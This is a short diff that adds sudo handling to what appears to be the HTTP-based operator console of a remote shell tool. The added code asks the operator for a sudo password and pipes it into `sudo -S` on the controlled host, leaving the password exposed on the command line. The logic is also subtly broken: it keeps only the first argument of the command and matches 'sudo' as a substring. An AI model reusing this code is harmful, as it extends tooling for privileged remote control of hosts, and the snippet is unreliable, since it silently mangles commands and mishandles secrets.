@@ -124,6 +124,13 @@ class MyServer(BaseHTTPRequestHandler):
                         os.system("clear")
                         continue
 
+                    if "sudo" in command.split()[0]:
+                        if not ":" in path:
+                            old_cmd = command.split()[1]
+                            print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
+                            sudo_pass = input(cinput + "\001\033[0m\002")
+                            command = str("echo " + '"' + sudo_pass + '"' + " | " + "sudo -S " + old_cmd)
+
                     if "upload" in command.split()[0]:
                         args = shlex.split(command)
                         if len(args) < 3 or len(args) > 3:
